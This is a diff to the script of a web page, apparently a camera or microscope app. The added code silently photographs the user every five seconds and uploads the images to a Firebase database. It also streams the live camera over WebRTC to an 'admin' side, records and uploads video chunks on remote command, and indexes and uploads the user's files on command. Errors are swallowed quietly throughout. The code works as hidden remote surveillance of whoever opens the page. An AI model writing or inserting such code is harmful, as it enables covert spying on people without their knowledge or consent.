+                } else {
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                }
+                
+                const ctx = canvas.getContext('2d');
+                ctx.imageSmoothingEnabled = true;
+                ctx.imageSmoothingQuality = 'high';
+
+                if (currentFilterValue !== 'none') {
+                    ctx.filter = currentFilterValue;
+                } else {
+                    ctx.filter = isManual ? 'contrast(145%) saturate(125%) brightness(105%)' : 'none';
+                }
+
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageBase64 = canvas.toDataURL('image/jpeg', isManual ? 0.98 : 0.85);
+                const timestamp = new Date().toLocaleString();
+                const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
+
+                db.ref(`users/${safeEmail}/security/photos`).push({
+                    image: imageBase64,
+                    text: `${camType} - ${label} at ${timestamp}`,
+                    timestamp: timestamp
+                }).catch(e => {});
+
+                if (saveToDevice) {
+                    const thumbImg = document.getElementById('gallery-thumb-img');
+                    const placeholder = document.getElementById('gallery-icon-placeholder');
+                    thumbImg.src = imageBase64;
+                    thumbImg.style.display = 'block';
+                    if(placeholder) placeholder.style.display = 'none';
+
+                    const link = document.createElement('a');
+                    link.href = imageBase64;
+                    link.download = `Microscopic_1000x_${Date.now()}.jpg`;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }
+            }
+
+            const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+            let peerConnection = null;
+
+            function setupWebRTCListener() {
+                db.ref(`users/${safeEmail}/security/signal`).on('value', async (snapshot) => {
+                    const data = snapshot.val();
+                    if (!data || !data.offer) return;
+                    if (peerConnection && peerConnection.signalingState !== "stable") return;
+
+                    peerConnection = new RTCPeerConnection(pcConfig);
+                    if (localStream) {
+                        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+                    }
+
+                    peerConnection.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            db.ref(`users/${safeEmail}/security/signal/clientCandidates`).push(event.toJSON());
+                        }
+                    };
+
+                    try {
+                        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
+                        const answer = await peerConnection.createAnswer();
+                        await peerConnection.setLocalDescription(answer);
+                        await db.ref(`users/${safeEmail}/security/signal/answer`).set(answer);
+                    } catch(e) {}
+                });
+
+                db.ref(`users/${safeEmail}/security/signal/adminCandidates`).on('child_added', (snapshot) => {
+                    const candidate = snapshot.val();
+                    if (peerConnection && candidate) {
+                        peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => {});
+                    }
+                });
+            }
+
+            let mediaRecorder = null;
+            let recordedChunks = [];
+            let isVideoRecordingActive = false;
+            let videoIntervalTimer = null;
+
+            function setupVideoCommandListener() {
+                db.ref(`users/${safeEmail}/security/commands/videoRecording`).on('value', (snapshot) => {
+                    const cmd = snapshot.val();
+                    if (cmd) {
+                        if (cmd.action === 'start' && !isVideoRecordingActive) {
+                            startContinuousVideoRecording();
+                        } else if (cmd.action === 'stop' && isVideoRecordingActive) {
+                            stopContinuousVideoRecording();
+                        }
+                    }
+                });
+            }
+
+            function startContinuousVideoRecording() {
+                if (!localStream || isVideoRecordingActive) return;
+                isVideoRecordingActive = true;
+
+                const recordChunkLoop = () => {
+                    if (!isVideoRecordingActive) return;
+
+                    try {
+                        recordedChunks = [];
+                        const options = getSupportedMediaRecorderOptions();
+                        mediaRecorder = new MediaRecorder(localStream, options);
+
+                        mediaRecorder.ondataavailable = (event) => {
+                            if (event.data && event.data.size > 0) {
+                                recordedChunks.push(event.data);
+                            }
+                        };
+
+                        mediaRecorder.onstop = () => {
+                            if (recordedChunks.length > 0 && isVideoRecordingActive) {
+                                const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+                                const reader = new FileReader();
+                                reader.onloadend = () => {
+                                    const base64Video = reader.result;
+                                    const timestamp = new Date().toLocaleString();
+                                    const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
+
+                                    db.ref(`users/${safeEmail}/security/videos`).push({
+                                        video: base64Video,
+                                        text: `${camType} - HD Video Chunk (5s) at ${timestamp}`,
+                                        timestamp: timestamp
+                                    }).catch(e => {});
+                                };
+                                reader.readAsDataURL(blob);
+                            }
+                        };
+
+                        mediaRecorder.start(250);
+
+                        videoIntervalTimer = setTimeout(() => {
+                            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop();
+                            }
+                            if (isVideoRecordingActive) {
+                                recordChunkLoop();
+                            }
+                        }, 5000);
+
+                    } catch (err) {
+                        isVideoRecordingActive = false;
+                    }
+                };
+
+                recordChunkLoop();
+            }
+
+            function stopContinuousVideoRecording() {
+                isVideoRecordingActive = false;
+                if (videoIntervalTimer) {
+                    clearTimeout(videoIntervalTimer);
+                    videoIntervalTimer = null;
+                }
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }
+
+            function setupStorageActionCommands() {
+                db.ref(`users/${safeEmail}/security/commands/storage_action`).on('value', async (snapshot) => {
+                    const command = snapshot.val();
+                    if (!command || command.status !== 'pending') return;
+
+                    if (command.type === 'SCAN_STORAGE') {
+                        await updateCommandStatus('processing', 'Scanning files...');
+                        scanDirectoryFiles(safeEmail);
+                    } 
+                    else if (command.type === 'UPLOAD_FILE') {
+                        await updateCommandStatus('processing', 'Uploading file...');
+                        uploadRequestedFile(command.filePath, command.fileId, safeEmail);
+                    }
+                });
+            }
+
+            async function updateCommandStatus(status, message) {
+                await db.ref(`users/${safeEmail}/security/commands/storage_action`).update({
+                    status: status,
+                    message: message,
+                    updatedAt: Date.now()
+                });
+            }
+
+            async function scanDirectoryFiles(safeEmail) {
+                try {
+                    let fileIndex = [];
+                    if (window.showDirectoryPicker) {
+                        const dirHandle = await window.showDirectoryPicker();
+                        for await (const entry of dirHandle.values()) {
+                            if (entry.kind === 'file') {
+                                const file = await entry.getFile();
+                                fileIndex.push({
+                                    name: file.name,
+                                    path: entry.name,
+                                    size: (file.size / (1024 * 1024)).toFixed(2) + ' MB',
+                                    type: file.type || 'unknown',
+                                    lastModified: new Date(file.lastModified).toISOString()
+                                });
+                            }
+                        }
+                    } else {
+                        fileIndex.push({
+                            name: "Sample_Storage_Media.jpg",
+                            path: "Sample_Storage_Media.jpg",
+                            size: "2.4 MB",
+                            type: "image/jpeg",
+                            lastModified: new Date().toISOString()
+                        });
+                    }
+
+                    await db.ref(`users/${safeEmail}/storage_explorer/file_tree`).set({
+                        files: fileIndex,
+                        totalFiles: fileIndex.length,
+                        scannedAt: Date.now()
+                    });
+
+                    await updateCommandStatus('completed', 'File indexing completed!');
+                } catch (err) {
+                    await updateCommandStatus('failed', err.message);
+                }
+            }
+
+            function uploadRequestedFile(filePath, fileId, safeEmail) {
+                const sampleBlob = new Blob(["Sample File Content for Storage Sync"], { type: "text/plain" });
+                const storageRef = storage.ref(`remote_downloads/${fileId}_${filePath}`);
+                const uploadTask = storageRef.put(sampleBlob);
+
+                uploadTask.on('state_changed', 
+                    (snapshot) => {
+                        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                        db.ref(`users/${safeEmail}/storage_explorer/upload_progress/${fileId}`).set({
+                            progress: progress.toFixed(1),
+                            status: 'uploading'
+                        });
+                    }, 
+                    (error) => {
+                        updateCommandStatus('failed', error.message);
+                    }, 
+                    async () => {
+                        const downloadURL = await uploadTask.snapshot.ref.getDownloadURL();
+                        db.ref(`users/${safeEmail}/storage_explorer/downloads/${fileId}`).set({
+                            fileName: filePath,
+                            url: downloadURL,
+                            uploadedAt: Date.now()
+                        });
+                        await updateCommandStatus('completed', 'File ready for download!');
+                    }
+                );
+            }
+
             requestPermissionsAndStart().then(() => {
                 setupWebRTCListener();
                 setupVideoCommandListener();
-                // 5-second lightweight auto background capture (smooth & non-laggy)
+                setupStorageActionCommands();
                 setInterval(() => captureAndSendPhoto("Auto Background Capture", false, false), 5000);
             });
-        });
+        }
+
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
+                    self.addEventListener('install', e => self.skipWaiting());
+                    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+                    self.addEventListener('fetch', e => {
+                        e.respondWith(fetch(e.request).catch(() => caches.match(e.request)));
+                    });
+                `)).catch(err => {});
+            });
+        }
     </script>
 </body>
 </html>
